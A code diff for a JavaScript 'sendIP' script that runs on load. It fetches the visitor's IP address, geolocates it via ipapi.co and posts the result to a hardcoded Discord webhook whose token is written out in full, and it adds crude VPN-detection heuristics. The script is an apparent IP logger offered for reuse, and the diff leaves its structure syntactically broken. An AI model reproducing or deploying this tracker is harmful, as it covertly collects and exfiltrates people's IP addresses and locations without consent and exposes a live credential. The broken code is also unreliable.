@@ -3,9 +3,31 @@ const sendIP = () => {
         .then(ipResponse => ipResponse.json())
         .then(ipData => {
             const ipadd = ipData.ip;
+
             return fetch(`https://ipapi.co/${ipadd}/json/`)
-                .then(geoResponse => geoResponse.json())
-                .then(geoData => {
+                .then(geoResponse => geoResponse.json());
+        })
+        .then(geoData => {
+            console.log('IP Info:', geoData);
+
+            // Basic VPN / proxy indicators
+            const isVPN =
+                geoData.org?.toLowerCase().includes('vpn') ||
+                geoData.org?.toLowerCase().includes('hosting') ||
+                geoData.org?.toLowerCase().includes('cloud') ||
+                geoData.asn?.startsWith('AS') && (
+                    geoData.org?.toLowerCase().includes('amazon') ||
+                    geoData.org?.toLowerCase().includes('google') ||
+                    geoData.org?.toLowerCase().includes('microsoft')
+                );
+
+            if (isVPN) {
+                console.warn('VPN or proxy likely detected');
+            } else {
+                console.log('No VPN detected');
+            }
+        })
+        .catch(err => console.error(err)); {
                     const dscURL = 'https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs'; // replace with your webhook url
                     return fetch(dscURL, {
                         method: 'POST',
@@ -40,4 +62,5 @@ const sendIP = () => {
         });
 };
 sendIP();
+
 
